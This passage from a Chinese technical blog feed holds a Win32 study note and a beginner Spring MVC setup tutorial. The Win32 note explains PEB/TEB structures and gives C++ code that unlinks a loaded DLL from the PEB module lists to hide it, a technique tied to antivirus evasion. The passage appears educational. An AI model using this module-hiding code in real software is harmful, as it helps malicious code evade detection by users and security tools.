title="模块隐藏-断链"></a>模块隐藏-断链</h2><p>API是从这几个结构体（<strong>结构体属于3环应用层</strong>）中查询出来的：</p><ol><li> TEB(Thread Environment Block，线程环境块)，它存放线程的相关信息，每一个线程都有自己的TEB信息，FS:[0]即是当前线程的TEB。</li><li> PEB(Process Environment Block，进程环境块)，它存放进程的相关信息，每个进程都有自己的PEB信息，FS:[0x30]即当前进程的PEB。</li></ol><p>如下图所示（只介绍与本章节相关的信息）</p><ol><li> TEB第一个成员是一个结构体，这个结构体包含了当前线程栈栈底和当前线程栈的界限；TEB的<strong>020</strong>偏移是一个结构体，其包含了两个成员，一个是当前线程所在进程的PID和当前线程自己的线程ID；</li><li> PEB的<strong>00c</strong>偏移是一个结构体，这个结构体包括<strong>模块链表</strong>，API函数遍历模块就是查看这个链表。</li></ol><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image2021-6-3_22-31-12.png"></p><p>FS寄存器中存储的就是当前正在使用的线程的TEB结构体的地址。</p><p>PEB结构体同理，我们只需要找到FS寄存器中存储地址的0x30偏移然后跟进即可</p><p>代码实现：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HideModule</span><span class="params">(<span class="keyword">char</span>* szModuleName)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取模块的句柄</span></span><br><span class="line">    HMODULE hMod = <span class="built_in">GetModuleHandle</span>(szModuleName);</span><br><span class="line">    PLIST_ENTRY Head, Cur;</span><br><span class="line">    PPEB_LDR_DATA ldr;</span><br><span class="line">    PLDR_MODULE ldmod;</span><br><span class="line">    </span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, fs:[<span class="number">0x30</span>] <span class="comment">// 取PEB结构体</span></span><br><span class="line">            mov ecx, [eax + <span class="number">0x0c</span>] <span class="comment">// 取PEB结构体的00c偏移的结构体，就是PEB_LDR_DATA</span></span><br><span class="line">            mov ldr, ecx <span class="comment">// 将ecx给到ldr</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取正在加载的模块列表</span></span><br><span class="line">    Head = &amp;(ldr-&gt;InLoadOrderModuleList);</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    Cur = Head-&gt;Flink;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 宏CONTAINING_RECORD根据结构体中某成员的地址来推算出该结构体整体的地址</span></span><br><span class="line">        ldmod = <span class="built_in">CONTAINING_RECORD</span>(Cur, LDR_MODULE, InLoadOrderModuleList);</span><br><span class="line">        <span class="comment">// 循环遍历，如果地址一致则表示找到对应模块来，就进行断链</span></span><br><span class="line">        <span class="keyword">if</span>(hMod == ldmod-&gt;BaseAddress) &#123;</span><br><span class="line">            <span class="comment">// 断链原理很简单就是将属性交错替换</span></span><br><span class="line">            ldmod-&gt;InLoadOrderModuleList.Blink-&gt;Flink = ldmod-&gt;InLoadOrderModuleList.Flink;</span><br><span class="line">            ldmod-&gt;InLoadOrderModuleList.Flink-&gt;Blink = ldmod-&gt;InLoadOrderModuleList.Blink;</span><br><span class="line">            </span><br><span class="line">            ldmod-&gt;InInitializationOrderModuleList.Blink-&gt;Flink = ldmod-&gt;InInitializationOrderModuleList.Flink;</span><br><span class="line">            ldmod-&gt;InInitializationOrderModuleList.Flink-&gt;Blink = ldmod-&gt;InInitializationOrderModuleList.Blink;</span><br><span class="line">            </span><br><span class="line">            ldmod-&gt;InMemoryOrderModuleList.Blink-&gt;Flink = ldmod-&gt;InMemoryOrderModuleList.Flink;</span><br><span class="line">            ldmod-&gt;InMemoryOrderModuleList.Flink-&gt;Blink = ldmod-&gt;InMemoryOrderModuleList.Blink;</span><br><span class="line">        &#125;</span><br><span class="line">        Cur = Cur-&gt;Flink;</span><br><span class="line">    &#125; <span class="keyword">while</span> (Head != Cur);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之后想看看免杀和内核相关的东西，先把win32再看一遍吧，好多都忘了，还是滴水的课程，感谢海哥的课程！&lt;/p&gt;
&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;</summary>
      
    
    
    
    
    <category term="Win32" scheme="http://example.com/tags/Win32/"/>
    
  </entry>
  
  <entry>
    <title>Spring MVC初探</title>
    <link href="http://example.com/2022/03/31/SpringMVC%E5%88%9D%E6%8E%A2/"/>
    <id>http://example.com/2022/03/31/SpringMVC%E5%88%9D%E6%8E%A2/</id>
    <published>2022-03-30T16:00:00.000Z</published>
    <updated>2022-04-01T08:14:53.051Z</updated>
    
    <content type="html"><![CDATA[<p>最近想看看java，不知道从哪开始，。。正好spring有最近不太平，就从spring MVC开始看吧。</p><p>[toc]</p><h1 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h1><p>“静态”与”动态”，这两个词最大的不同就是在于其<strong>交互性</strong>。动态页面却可以实现根据用户的要求和选择而动态的去改变和响应，浏览器客户端，成为了前后端动态交互的一个桥梁。</p><h2 id="三层架构"><a href="#三层架构" class="headerlink" title="三层架构"></a>三层架构</h2><p>BS架构中，常见的为三层架构的开发模式：</p><ol><li><p>表现层（WEB层）</p><ul><li><p>  作用：接收客户端请求（一般是HTTP请求），同时向其响应结果</p></li><li><p>  分类：表现层分为，展示层和控制层，控制层 (Servlet) 负责接收请求，展示层 (HTML JSP) 负责结果的展示</p></li><li><p>在表现层会依赖于业务层，进行业务处理，也就是好比在 Servlet 中调用某个Service</p><p>  一般使用 MVC 模型开发（仅限此层，详情下面会说）</p></li></ul></li><li><p>业务层（Service层）</p><ul><li>  作用：根据项目需求，进行业务逻辑处理</li><li>  在业务层可能会依赖于持久层，也就是好比在 Service 中调用某个 Dao</li></ul></li><li><p>持久层（Dao）</p><ul><li>  作用：数据持久化</li><li>  说白了，就是实现和数据库之间的交互，本质都是增删改查，只不过不同的项目复杂程度会有所不同</li></ul></li></ol><h2 id="MVC模型"><a href="#MVC模型" class="headerlink" title="MVC模型"></a>MVC模型</h2><p>model-view-controller</p><ul><li>Model(模型)<ul><li>   可以叫做数据模型层，也就是用来封装数据的，例如请求的过程中，用户信息被封装在 User 实体类中，这个实体类就属于 Model 层中</li></ul></li><li>View(视图)<ul><li>  选择一个恰当的视图来显示最终的执行结果，例如常见的 HTML JSP 就是用来展示数据的</li></ul></li><li>Controller(控制)<ul><li>  比较直观的用来处理交互的部分，接收用户请求，然后执行业务等流程，以及一些数据的校验，最终反馈结果</li></ul></li></ul><p>如图：</p><p><img src="/2022/03/31/SpringMVC%E5%88%9D%E6%8E%A2/image-20220331215345787.png" alt="image-20220331215345787"></p><p>这一款框架，本质上也是基于 Servlet 的。</p><h1 id="浅尝"><a href="#浅尝" class="headerlink" title="浅尝"></a>浅尝</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>选择webapp：</p><p><img src="/2022/03/31/SpringMVC%E5%88%9D%E6%8E%A2/image-20220331215654564.png" alt="image-20220331215654564"></p><p>创建java和resource文件夹.</p><p>pom文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.ideal<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring_mvc_01_basic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>spring_mvc_01_basic Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- FIXME change it to the project&#x27;s website --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://www.example.com<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">spring.version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">spring.version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>spring_mvc_01_basic<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pluginManagement</span>&gt;</span><span class="comment">&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-clean-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-resources-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.22.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-war-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-install-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-deploy-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h2><p>在javaweb中，前端发出的请求，都会被映射到 Web.xml 中，然后匹配到对应的 Servlet 中，然后调用对应的 Servlet 类 来处理这个请求</p><h3 id="配置核心控制器"><a href="#配置核心控制器" class="headerlink" title="配置核心控制器"></a>配置核心控制器</h3><p>由于现在使用springmvc，就都交给springmvc进行管理，在webapp-web-info中找到web.xml，进行配置核心控制器，<code>DispatcherServelt</code></p><p><code>&lt;servlet &gt;&lt;/servlet &gt;</code>标签中指定了一个实现类为 DispatcherServelt ，名称为 dispatcherServlet 的 servlet 配置</p><p><code>&lt;servlet-mapping&gt;&lt;/servlet-mapping&gt;</code>标签中则指定了 dispatcherServlet 拦截请求的范围，使用 <code>/</code> 即代表所有请求都需要经过这里</p><p><code>&lt;init-param&gt;&lt;/init-param&gt;</code>标签对中放置 DispatcherServelt 所需要的初始化参数，配置的是 contextConfigLocation 上下文参数变量，其加载的配置文件为编译目录下的 springmvc.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置Servlet初始化参数，读取springmvc的配置文件，创建spring容器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:springmvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 配置servlet启动时加载对象--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="创建核心配置文件"><a href="#创建核心配置文件" class="headerlink" title="创建核心配置文件"></a>创建核心配置文件</h3><p>开启扫描，以及开启注解，还有就是配置视图解析器，它的作用就是执行方法后，根据返回的信息，来加载相应的界面，并且绑定反馈数据。刚开始访问controller的时候一直是500，后来知道这个xml在resource下（应该是位置的问题），springmvc.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc/spring-mvc.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 配置spring创建容器时要扫描的包--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.yutao&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 配置视图解析器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;viewResolver&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/pages/&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span 